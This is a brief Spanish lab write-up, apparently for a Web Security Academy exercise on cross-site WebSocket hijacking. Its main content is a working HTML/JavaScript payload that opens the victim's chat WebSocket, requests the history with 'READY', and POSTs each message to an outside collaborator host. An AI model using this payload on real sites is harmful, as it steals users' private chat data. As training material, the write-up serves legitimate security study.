---
title: "2 - Cross-site WebSocket hijacking"
---

# 2 - Cross-site WebSocket hijacking

Enviar un  READY parece ser que responde con todo el historial del chat, la idea sería montar un CSRF versión websockets para robarle el chat a la otra persona que esté detrás

```html
<script>
    var ws = new WebSocket('wss://0a8200d60458e9a6807c03f3005c009e.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://fveoqfwor0bb86jxjhmi28rqmhscg44t.oastify.com', {method: 'POST', body: event.data});
    };
</script>
```
